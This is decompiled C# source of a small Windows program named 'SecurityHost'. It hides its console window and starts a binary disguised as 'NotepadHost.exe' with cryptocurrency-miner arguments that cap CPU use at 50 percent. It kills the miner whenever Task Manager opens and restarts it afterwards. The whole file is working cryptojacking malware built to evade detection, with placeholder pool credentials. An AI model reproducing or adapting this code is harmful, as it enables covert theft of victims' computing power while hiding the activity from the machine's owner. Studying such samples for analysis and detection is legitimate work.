// Decompiled with JetBrains decompiler
// Type: erteterterter45435345.Program
// Assembly: SecurityHost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BBC7552-14BC-4167-AAE5-18447C0AC968
// Assembly location: C:\Users\gorno\Desktop\SecurityHost.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace erteterterter45435345
{
  internal class Program
  {
    private const int SW_HIDE = 0;

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private static void Main(string[] args)
    {
      Program.ShowWindow(Program.GetConsoleWindow(), 0);
      int num = 0;
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName == "SecurityHost")
          ++num;
      }
      if (num > 1)
        Process.GetCurrentProcess().Kill();
      Thread.Sleep(5000);
      ProcessStartInfo startInfo = new ProcessStartInfo()
      {
        FileName = "C:\\ProgramData\\system86\\NotepadHost.exe",
        UseShellExecute = false,
        CreateNoWindow = true
      };
      startInfo.Arguments = "-o pool -O user:pass --max-cpu-usage=50 -k -r1 -R1  --print-time=10";
      Process.Start(startInfo);
      while (true)
      {
        do
        {
          Thread.Sleep(2000);
        }
        while ((uint) Process.GetProcessesByName("TaskMgr").Length <= 0U);
        Process.GetProcessesByName("NotepadHost")[0].Kill();
        Thread.Sleep(40000);
        Process.Start(startInfo);
      }
    }
  }
}
